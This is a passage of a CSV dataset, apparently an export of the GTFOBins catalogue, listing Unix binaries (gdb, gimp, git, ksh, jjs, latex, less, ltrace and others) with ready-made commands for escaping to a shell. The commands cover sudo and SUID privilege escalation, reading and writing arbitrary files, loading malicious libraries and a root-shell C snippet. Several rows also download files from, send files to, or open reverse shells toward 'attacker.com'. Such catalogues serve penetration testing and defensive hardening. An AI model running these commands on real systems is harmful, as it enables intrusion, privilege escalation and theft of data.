local c=s:accept();   while true do     local r,x=c:receive();local f=assert(io.popen(r,""r""));     local b=assert(f:read(""*a""));c:send(b);   end;c:close();f:close();'","","","","","","","","","","","false"
"ltrace","","","ltrace -b -L /bin/sh","","","sudo ltrace -b -L /bin/sh","","","LFILE=file_to_read ltrace -F $LFILE /dev/null","","","","LFILE=file_to_write ltrace -s 999 -o $LFILE ltrace -F DATA","","","","","","The file is parsed as a configuration file and its content is shown as error messages, thus this is not suitable to exfiltrate binary files.","","","","","","","","","","","The data to be written appears amid the library function call log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough. More generally, any binary that executes whatever library function call passing arbitrary data can be used in place of `ltrace -F DATA`.","","","","","","","","","","","","","","","","","false"
"lp","","","","","","","","","","","","","","","","","","","","","","","","","","","","To collect the file run the following on the attacker box (this requires `cups` to be installed):  1. `lpadmin -p printer -v socket://localhost -E` to create a virtual printer; 2. `lpadmin -d printer` to set the new printer as default; 3. `cupsctl --remote-any` to enable printing from the Internet; 4. `nc -lkp 9100` to receive the file.  Send a local file to a CUPS server.","LFILE=file_to_send RHOST=attacker.com lp $LFILE -h $RHOST","","","","","","","","","","","","","","","","","","false"
"look","","","","","","LFILE=file_to_read sudo look '' ""$LFILE""","","","LFILE=file_to_read look '' ""$LFILE""","","LFILE=file_to_read ./look '' ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"logsave","","","logsave /dev/null /bin/sh -i","","","sudo logsave /dev/null /bin/sh -i","","","","","./logsave /dev/null /bin/sh -i -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"loginctl","","","loginctl user-status !/bin/sh","","","sudo loginctl user-status !/bin/sh","This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.  This might not work if run by unprivileged users depending on the system configuration.","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"ln","","","","","","sudo ln -fs /bin/sh /bin/ln sudo ln","This overrides `ln` itself with a symlink to a shell (or any other executable) that is to be executed as root, useful in case a `sudo` rule allows to only run `ln` by path. Warning, this is a destructive action.","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"links","","","","","","LFILE=file_to_read sudo links ""$LFILE""","The result is displayed in a TUI interface.","","LFILE=file_to_read links ""$LFILE""","","LFILE=file_to_read ./links ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"lftp","","","lftp -c '!/bin/sh'","","","sudo lftp -c '!/bin/sh'","","","","","","","","","./lftp -c '!/bin/sh'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"less","","","[''less /etc/profile !/bin/sh ''-|-''VISUAL=""/bin/sh -c '/bin/sh'"" less /etc/profile v ''-|-''less /etc/profile v:shell '']","","","sudo less /etc/profile !/bin/sh","","","[''less file_to_read''-|-''less /etc/profile :e file_to_read '']","","./less file_to_read","","[''echo DATA | less sfile_to_write q ''-|-''less file_to_write v '']","","","","","","This is useful when `less` is used as a pager by another binary to read a different file.","","","","","","","","","","","This invokes the default editor to edit the file. The file must exist.","","","","","","","","","","","","","","","","","false"
"ldconfig","","","","","This allows to override one or more shared libraries. Beware though that it is easy to *break* target and other binaries.","TF=$(mktemp -d) echo ""$TF"" > ""$TF/conf"" # move malicious libraries in $TF sudo ldconfig -f ""$TF/conf""","Follows a minimal example of how to use the described technique (details may change across different distributions).  Run the code associated with the technique.  Identify a target SUID executable, for example the `libcap` library of `ping`:  ``` $ ldd /bin/ping | grep libcap       libcap.so.2 => /tmp/tmp.9qfoUyKaGu/libcap.so.2 (0x00007fc7e9797000) ```  Create a fake library that spawns a shell at bootstrap:  ``` echo '#include <unistd.h>  __attribute__((constructor)) static void init() {     execl(""/bin/sh"", ""/bin/sh"", ""-p"", NULL); } ' >""$TF/lib.c"" ```  Compile it with:  ``` gcc -fPIC -shared ""$TF/lib.c"" -o ""$TF/libcap.so.2"" ```  Run `ldconfig` again as described below then just run `ping` to obtain a root shell:  ``` $ ping # id uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user) ```","","","","","","","","TF=$(mktemp -d) echo ""$TF"" > ""$TF/conf"" # move malicious libraries in $TF ./ldconfig -f ""$TF/conf""","","","","","","","","","","","","","","","","","","","","","","","","","","","","This allows to override one or more shared libraries. Beware though that it is easy to *break* target and other binaries.","","","","false"
"ld.so","","","/lib/ld.so /bin/sh","","","sudo /lib/ld.so /bin/sh","`ld.so` is the Linux dynamic linker/loader, its filename and location might change across distributions. The proper path is can be obtained with:  ``` $ strings /proc/self/exe | head -1 /lib64/ld-linux-x86-64.so.2 ```  It's worth noting that the spawned process will be the loader, not the target executable, this might aid evasion. See https://shyft.us/posts/20230526_linux_command_proxy.html for more information.","","","","./ld.so /bin/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"latexmk","","","[''latexmk -e 'exec ""/bin/sh"";' ''-|-''latexmk -latex='/bin/sh #' /dev/null '']","","","sudo latexmk -e 'exec ""/bin/sh"";'","This allows to execute [`perl`](/gtfobins/perl/) code.","","[''latexmk -e 'open(X,""/etc/passwd"");while(<X>){print $_;}exit' ''-|-''TF=$(mktemp) echo '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}' >$TF strings tmp.dvi '']","","","","","","","","","","The read file will be part of the output.","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"latex","","","latex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'","","The read file will be part of the output.","[''sudo latex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}' strings article.dvi ''-|-''sudo latex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}' '']","","","latex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}' strings article.dvi","","","","","","./latex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'","","","","The read file will be part of the output.","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"kubectl","","","","","","LFILE=dir_to_serve sudo kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/","It serves files from a specified directory via HTTP, i.e., `http://<IP>:4444/x/<file>`.","","","","LFILE=dir_to_serve ./kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/","","","","","","","","","","","","","","","","","","LFILE=dir_to_serve kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/","","","","","","","","","","","","","","","","","","false"
"ksu","","","","","","sudo ksu -q -e /bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"ksshell","","","","","","LFILE=file_to_read sudo ksshell -i $LFILE","Each line is corrupted by a prefix string. Also consider that lines are actually parsed as `kickstart` scripts thus some file contents may lead to unexpected results.","","LFILE=file_to_read ksshell -i $LFILE","","LFILE=file_to_read ./ksshell -i $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"ksh","","","ksh","","","sudo ksh","","","[''export LFILE=file_to_read ksh -c 'echo ""$(<$LFILE)""' ''-|-''export LFILE=file_to_read ksh -c $'read -r -d \x04 < ""$LFILE""; echo ""$REPLY""' '']","","./ksh -p","","export LFILE=file_to_write ksh -c 'echo DATA > $LFILE'","","","","[''Fetch a remote file via HTTP GET request.''-|-''Fetch remote file using a TCP connection. Run `nc -l -p 12345 < ""file_to_send""` on the attacker box to send the file.'']","[''export RHOST=attacker.com export RPORT=12345 export LFILE=file_to_get ksh -c '{ echo -ne ""GET /$LFILE HTTP/1.0\r\nhost: $RHOST\r\n\r\n"" 1>&3; cat 0<&3; } \     3<>/dev/tcp/$RHOST/$RPORT \     | { while read -r; do [ ""$REPLY"" = ""$(echo -ne ""\r"")"" ] && break; done; cat; } > $LFILE' ''-|-''export RHOST=attacker.com export RPORT=12345 export LFILE=file_to_get ksh -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE' '']","[''It trims trailing newlines.''-|-''It trims trailing newlines.'']","","","","","","","","","[''Send local file in the body of an HTTP POST request. Run an HTTP service on the attacker box to collect the file.''-|-''Send local file using a TCP connection. Run `nc -l -p 12345 > ""file_to_save""` on the attacker box to collect the file.'']","[''export RHOST=attacker.com export RPORT=12345 export LFILE=file_to_send ksh -c 'echo -e ""POST / HTTP/0.9\n\n$(cat $LFILE)"" > /dev/tcp/$RHOST/$RPORT' ''-|-''export RHOST=attacker.com export RPORT=12345 export LFILE=file_to_send ksh -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT' '']","","","Run `nc -l -p 12345` on the attacker box to receive the shell.","export RHOST=attacker.com export RPORT=12345 ksh -c 'ksh -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1'","","","","","","","","","","","","","","false"
"knife","","","knife exec -E 'exec ""/bin/sh""'","","","sudo knife exec -E 'exec ""/bin/sh""'","This is capable of running [`ruby`](/gtfobins/ruby/) code.","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"julia","","","julia -e 'run(`/bin/sh`)'","","","sudo julia -e 'run(`/bin/sh`)'","","","export LFILE=file_to_read julia -e 'print(open(f->read(f, String), ENV[""LFILE""]))'","","./julia -e 'run(`/bin/sh -p`)'","","export LFILE=file_to_write julia -e 'open(f->write(f, ""DATA""), ENV[""LFILE""], ""w"")'","","","","","export URL=http://attacker.com/file_to_get export LFILE=file_to_save julia -e 'download(ENV[""URL""], ENV[""LFILE""])'","","","","","","","","","","","","","","Run `nc -l -p 12345` on the attacker box to receive the shell.","export RHOST=attacker.com export RPORT=12345 julia -e 'using Sockets; sock=connect(ENV[""RHOST""], parse(Int64,ENV[""RPORT""])); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'","","","","","","","","","","","","","","false"
"jtag","","","jtag --interactive shell /bin/sh","","","sudo jtag --interactive shell /bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"jrunscript","","","jrunscript -e ""exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')""","","","sudo jrunscript -e ""exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')""","This tool is installed starting with Java SE 6.","","jrunscript -e 'br = new BufferedReader(new java.io.FileReader(""file_to_read"")); while ((line = br.readLine()) != null) { print(line); }'","","./jrunscript -e ""exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')""","","jrunscript -e 'var fw=new java.io.FileWriter(""./file_to_write""); fw.write(""DATA""); fw.close();'","","","","Fetch a remote file via HTTP GET request.","URL=http://attacker.com/file_to_get LFILE=file_to_save jrunscript -e ""cp('$URL','$LFILE')""","","This has been found working in macOS but failing on Linux systems.","","","","","","","","","","","","Run `nc -l -p 12345` on the attacker box to receive the shell.","export RHOST=attacker.com export RPORT=12345 jrunscript -e 'var host='""'""""$RHOST""""'""'; var port='""$RPORT""'; var p=new java.lang.ProcessBuilder(""/bin/bash"", ""-i"").redirectErrorStream(true).start(); var s=new java.net.Socket(host,port); var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream(); var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); java.lang.Thread.sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'","","","","","","","","","","","","","","false"
"jq","","","","","","LFILE=file_to_read sudo jq -Rr . ""$LFILE""","","","LFILE=file_to_read jq -Rr . ""$LFILE""","","LFILE=file_to_read ./jq -Rr . ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"journalctl","","","journalctl !/bin/sh","","","sudo journalctl !/bin/sh","This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.  This might not work if run by unprivileged users depending on the system configuration.","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"join","","","","","","LFILE=file_to_read sudo join -a 2 /dev/null $LFILE","","","LFILE=file_to_read join -a 2 /dev/null $LFILE","","LFILE=file_to_read ./join -a 2 /dev/null $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"joe","","","joe ^K!/bin/sh","","","sudo joe ^K!/bin/sh","","","","","","","","","./joe ^K!/bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"jjs","","","echo ""Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()"" | jjs","","","echo ""Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()"" | sudo jjs","This tool is installed starting with Java SE 8.","","echo 'var BufferedReader = Java.type(""java.io.BufferedReader""); var FileReader = Java.type(""java.io.FileReader""); var br = new BufferedReader(new FileReader(""file_to_read"")); while ((line = br.readLine()) != null) { print(line); }' | jjs","","echo ""Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()"" | ./jjs","","echo 'var FileWriter = Java.type(""java.io.FileWriter""); var fw=new FileWriter(""./file_to_write""); fw.write(""DATA""); fw.close();' | jjs","","","","Fetch a remote file via HTTP GET request.","export URL=http://attacker.com/file_to_get export LFILE=file_to_save echo ""var URL = Java.type('java.net.URL'); var ws = new URL('$URL'); var Channels = Java.type('java.nio.channels.Channels'); var rbc = Channels.newChannel(ws.openStream()); var FileOutputStream = Java.type('java.io.FileOutputStream'); var fos = new FileOutputStream('$LFILE'); fos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE); fos.close(); rbc.close();"" | jjs","","This has been found working in macOS but failing on Linux systems.","","","","","","","","","","","","Run `nc -l -p 12345` on the attacker box to receive the shell.","export RHOST=attacker.com export RPORT=12345 echo 'var host=Java.type(""java.lang.System"").getenv(""RHOST""); var port=Java.type(""java.lang.System"").getenv(""RPORT""); var ProcessBuilder = Java.type(""java.lang.ProcessBuilder""); var p=new ProcessBuilder(""/bin/bash"", ""-i"").redirectErrorStream(true).start(); var Socket = Java.type(""java.net.Socket""); var s=new Socket(host,port); var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream(); var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type(""java.lang.Thread"").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();' | jjs","","","","","","","","","","","","","","false"
"ispell","","","ispell /etc/passwd !/bin/sh","","","sudo ispell /etc/passwd !/bin/sh","","","","","./ispell /etc/passwd !/bin/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"irb","","","irb exec '/bin/bash'","","","sudo irb exec '/bin/bash'","","","irb puts File.read(""file_to_read"")","","","","irb File.open(""file_to_write"", ""w+"") { |f| f.write(""DATA"") }","","","","Fetch a remote file via HTTP GET request.","export URL=http://attacker.com/file_to_get export LFILE=file_to_save irb require 'open-uri'; download = open(ENV['URL']); IO.copy_stream(download, ENV['LFILE'])","","","","","","","","","","Serve files in the local folder running an HTTP server on port 8888.","irb require 'webrick'; WEBrick::HTTPServer.new(:Port => 8888, :DocumentRoot => Dir.pwd).start;","","","Run `nc -l -p 12345` on the attacker box to receive the shell.","export RHOST='127.0.0.1' export RPORT=9000 irb require 'socket'; exit if fork;c=TCPSocket.new(ENV[""RHOST""],ENV[""RPORT""]);while(cmd=c.gets);IO.popen(cmd,""r""){|io|c.print io.read} end","","","","","","irb require ""fiddle""; Fiddle.dlopen(""lib.so"")","","","","","","","","false"
"ip","","","","","[''This only works for Linux with CONFIG_NET_NS=y.''-|-''This only works for Linux with CONFIG_NET_NS=y. This version also grants network access.'']","[''LFILE=file_to_read sudo ip -force -batch ""$LFILE"" ''-|-''sudo ip netns add foo sudo ip netns exec foo /bin/sh sudo ip netns delete foo ''-|-''sudo ip netns add foo sudo ip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar sudo ip netns exec bar /bin/sh sudo ip netns delete foo sudo ip netns delete bar '']","The read file content is corrupted by error prints.","","LFILE=file_to_read ip -force -batch ""$LFILE""","","[''LFILE=file_to_read ./ip -force -batch ""$LFILE"" ''-|-''./ip netns add foo ./ip netns exec foo /bin/sh -p ./ip netns delete foo '']","","","","","","","","","This only works for Linux with CONFIG_NET_NS=y.","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"ionice","","","ionice /bin/sh","","","sudo ionice /bin/sh","","","","","./ionice /bin/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"install","","","","","","LFILE=file_to_change TF=$(mktemp) sudo install -m 6777 $LFILE $TF","This can be run with elevated privileges to change permissions (`6` denotes the SUID bits) and then read, write, or execute a copy of the file.","","","","LFILE=file_to_change TF=$(mktemp) ./install -m 6777 $LFILE $TF","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"iftop","","","iftop !/bin/sh","","","sudo iftop !/bin/sh","This requires `iftop` 0.17 and the privilege to capture on some device (specify with `-i` if needed) .","","","","","","","","./iftop !/bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"iconv","","","","","","LFILE=file_to_read ./iconv -f 8859_1 -t 8859_1 ""$LFILE""","The `8859_1` encoding is used as it accepts any single-byte sequence, thus it allows to read/write arbitrary files. Other encoding combinations may corrupt the result.","","LFILE=file_to_read iconv -f 8859_1 -t 8859_1 ""$LFILE""","","LFILE=file_to_read ./iconv -f 8859_1 -t 8859_1 ""$LFILE""","","LFILE=file_to_write echo ""DATA"" | iconv -f 8859_1 -t 8859_1 -o ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"hping3","","","hping3 /bin/sh","","The file is continuously sent, adjust the `--count` parameter or kill the sender when done. Receive on the attacker box with:  ``` sudo hping3 --icmp --listen xxx --dump ```","[''sudo hping3 /bin/sh ''-|-''RHOST=attacker.com LFILE=file_to_read sudo hping3 ""$RHOST"" --icmp --data 500 --sign xxx --file ""$LFILE""'']","","","","","./hping3 /bin/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"highlight","","","","","","LFILE=file_to_read sudo highlight --no-doc --failsafe ""$LFILE""","","","LFILE=file_to_read highlight --no-doc --failsafe ""$LFILE""","","LFILE=file_to_read ./highlight --no-doc --failsafe ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"hexdump","","","","","","LFILE=file_to_read sudo hexdump -C ""$LFILE""","The output is actually an hex dump.","","LFILE=file_to_read hexdump -C ""$LFILE""","","LFILE=file_to_read ./hexdump -C ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"head","","","","","","LFILE=file_to_read sudo head -c1G ""$LFILE""","","","LFILE=file_to_read head -c1G ""$LFILE""","","LFILE=file_to_read ./head -c1G ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"hd","","","","","","LFILE=file_to_read sudo hd ""$LFILE""","The output is actually an hex dump.","","LFILE=file_to_read hd ""$LFILE""","","LFILE=file_to_read ./hd ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"gzip","","","","","","LFILE=file_to_read sudo gzip -f $LFILE -t","There are also a number of other utilities that rely on `gzip` under the hood, e.g., `zless`, `zcat`, `gunzip`, etc. Besides having similar features, they also allow privileged reads if `gzip` itself is SUID.","","[''LFILE=file_to_read gzip -f $LFILE -t ''-|-''LFILE=file_to_read gzip -c $LFILE | gzip -d '']","","LFILE=file_to_read ./gzip -f $LFILE -t","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"gtester","","","TF=$(mktemp) echo '#!/bin/sh' > $TF echo 'exec /bin/sh -p 0<&1' >> $TF chmod +x $TF gtester -q $TF","","","TF=$(mktemp) echo '#!/bin/sh' > $TF echo 'exec /bin/sh 0<&1' >> $TF chmod +x $TF sudo gtester -q $TF","","","","","TF=$(mktemp) echo '#!/bin/sh -p' > $TF echo 'exec /bin/sh -p 0<&1' >> $TF chmod +x $TF sudo gtester -q $TF","","LFILE=file_to_write gtester ""DATA"" -o $LFILE","","","","","","","","","","","","","","","","","Data to be written appears in an XML attribute in the output file (`<testbinary path=""DATA"">`).","","","","","","","","","","","","","","","","","false"
"grep","","","","","","LFILE=file_to_read sudo grep '' $LFILE","There are many `grep` flavors that in many cases are just copies, symlinks or wrappers around the original binary that may share the same behavior, for example: `egrep`, `fgrep`, `zgrep`, etc.","","LFILE=file_to_read grep '' $LFILE","","LFILE=file_to_read ./grep '' $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"grc","","","grc --pty /bin/sh","","","sudo grc --pty /bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"git","","[''This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.''-|-''The help system can also be reached from any `git` command, e.g., `git branch`. This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.''-|-''Git hooks are merely shell scripts and in the following example the hook associated to the `pre-commit` action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used and moving into the directory works too, i.e., instead of using the `-C` option.'']","[''PAGER='sh -c ""exec sh 0<&1""' git -p help''-|-''git help config !/bin/sh ''-|-''git branch --help config !/bin/sh ''-|-''TF=$(mktemp -d) git init ""$TF"" echo 'exec /bin/sh 0<&2 1>&2' >""$TF/.git/hooks/pre-commit.sample"" mv ""$TF/.git/hooks/pre-commit.sample"" ""$TF/.git/hooks/pre-commit"" git -C ""$TF"" commit --allow-empty -m x ''-|-''TF=$(mktemp -d) ln -s /bin/sh ""$TF/git-x"" git ""--exec-path=$TF"" x '']","","[''This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.''-|-''The help system can also be reached from any `git` command, e.g., `git branch`. This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.''-|-''Git hooks are merely shell scripts and in the following example the hook associated to the `pre-commit` action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used and moving into the directory works too, i.e., instead of using the `-C` option.'']","[''sudo PAGER='sh -c ""exec sh 0<&1""' git -p help''-|-''sudo git -p help config !/bin/sh ''-|-''sudo git branch --help config !/bin/sh ''-|-''TF=$(mktemp -d) git init ""$TF"" echo 'exec /bin/sh 0<&2 1>&2' >""$TF/.git/hooks/pre-commit.sample"" mv ""$TF/.git/hooks/pre-commit.sample"" ""$TF/.git/hooks/pre-commit"" sudo git -C ""$TF"" commit --allow-empty -m x ''-|-''TF=$(mktemp -d) ln -s /bin/sh ""$TF/git-x"" sudo git ""--exec-path=$TF"" x '']","","","LFILE=file_to_read git diff /dev/null $LFILE","","","","git apply --unsafe-paths --directory / x.patch","","PAGER='sh -c ""exec sh 0<&1""' ./git -p help","","","","The read file content is displayed in `diff` style output format.","","","","","","","","","","","The patch can be created locally by creating the file that will be written on the target using its absolute path, then `git diff /dev/null /path/to/file >x.patch`.","","","","","","","","","","","","","","","","","false"
"ginsh","","","ginsh !/bin/sh","","","sudo ginsh !/bin/sh","","","","","","","","","./ginsh !/bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"gimp","","","gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(""sh"")'","","","sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(""sh"")'","The binary hangs after executing the Python code and can be terminated pressing ``ctrl-c``.","","gimp -idf --batch-interpreter=python-fu-eval -b 'print(open(""file_to_read"").read())'","","./gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(""/bin/sh"", ""sh"", ""-p"")'","","gimp -idf --batch-interpreter=python-fu-eval -b 'open(""file_to_write"", ""wb"").write(""DATA"")'","","","","Fetch a remote file via HTTP GET request.","export URL=http://attacker.com/file_to_get export LFILE=file_to_save gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e if sys.version_info.major == 3: import urllib.request as r else: import urllib as r r.urlretrieve(e[""URL""], e[""LFILE""])'","","","","","","","","","","[''Send local file via ""d"" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.''-|-''Serve files in the local folder running an HTTP server.'']","[''export URL=http://attacker.com/ export LFILE=file_to_send gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u else: import urllib as u, urllib2 as r r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))' ''-|-''export LPORT=8888 gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e if sys.version_info.major == 3: import http.server as s, socketserver as ss else: import SimpleHTTPServer as s, SocketServer as ss ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()' '']","","","Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.","export RHOST=attacker.com export RPORT=12345 gimp -idf --batch-interpreter=python-fu-eval -b 'import sys,socket,os,pty;s=socket.socket() s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT"")))) [os.dup2(s.fileno(),fd) for fd in (0,1,2)] pty.spawn(""/bin/sh"")'","","","","","","gimp -idf --batch-interpreter=python-fu-eval -b 'from ctypes import cdll; cdll.LoadLibrary(""lib.so"")'","","","","","","","","false"
"ghci","","","ghci System.Process.callCommand ""/bin/sh""","","","sudo ghci System.Process.callCommand ""/bin/sh""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"ghc","","","ghc -e 'System.Process.callCommand ""/bin/sh""'","","","sudo ghc -e 'System.Process.callCommand ""/bin/sh""'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"genisoimage","","","","","","LFILE=file_to_read sudo genisoimage -q -o - ""$LFILE""","The output is placed inside the ISO9660 file system binary format thus it may not be suitable for binary content as is, yet it can be mounted or extracted with tools like `7z`.","","LFILE=file_to_read genisoimage -q -o - ""$LFILE""","","LFILE=file_to_read ./genisoimage -sort ""$LFILE""","","","","","","","","","The file is parsed, and some of its content is disclosed by the error messages, thus this might not be suitable to read arbitrary data.","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"genie","","","genie -c '/bin/sh'","","","sudo genie -c '/bin/sh'","","","","","./genie -c '/bin/sh'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"gem","","[''This requires the name of an installed gem to be provided (`rdoc` is usually installed).''-|-''This invokes the default editor, which is likely to be [`vi`](/gtfobins/vi/), other functions may apply. This requires the name of an installed gem to be provided (`rdoc` is usually installed).''-|-''This executes the specified file as [`ruby`](/gtfobins/ruby/) code.''-|-''This executes the specified file as [`ruby`](/gtfobins/ruby/) code.'']","[''gem open -e ""/bin/sh -c /bin/sh"" rdoc''-|-''gem open rdoc :!/bin/sh ''-|-''TF=$(mktemp -d) echo 'system(""/bin/sh"")' > $TF/x gem build $TF/x ''-|-''TF=$(mktemp -d) echo 'system(""/bin/sh"")' > $TF/x gem install --file $TF/x '']","","This requires the name of an installed gem to be provided (`rdoc` is usually installed).","sudo gem open -e ""/bin/sh -c /bin/sh"" rdoc","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"gdb","","","gdb -nx -ex '!sh' -ex quit","","","sudo gdb -nx -ex '!sh' -ex quit","","","gdb -nx -ex 'python print(open(""file_to_read"").read())' -ex quit","","./gdb -nx -ex 'python import os; os.execl(""/bin/sh"", ""sh"", ""-p"")' -ex quit","","LFILE=file_to_write gdb -nx -ex ""dump value $LFILE \""DATA\"""" -ex quit","","","","This requires that GDB is compiled with Python support. Fetch a remote file via HTTP GET request.","export URL=http://attacker.com/file_to_get export LFILE=file_to_save gdb -nx -ex 'python import sys; from os import environ as e if sys.version_info.major == 3: import urllib.request as r else: import urllib as r r.urlretrieve(e[""URL""], e[""LFILE""])' -ex quit","This requires that GDB is compiled with Python support.","This requires that GDB is compiled with Python support.","","","","","","","","[''This requires that GDB is compiled with Python support. Send local file via ""d"" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.''-|-''This requires that GDB is compiled with Python support. Serve files in the local folder running an HTTP server.'']","[''export URL=http://attacker.com/ export LFILE=file_to_send gdb -nx -ex 'python import sys; from os import environ as e if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u else: import urllib as u, urllib2 as r r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))' -ex quit ''-|-''export LPORT=8888 gdb -nx -ex 'python import sys; from os import environ as e if sys.version_info.major == 3: import http.server as s, socketserver as ss else: import SimpleHTTPServer as s, SocketServer as ss ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()' -ex quit '']","This requires that GDB is compiled with Python support.","","This requires that GDB is compiled with Python support. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.","export 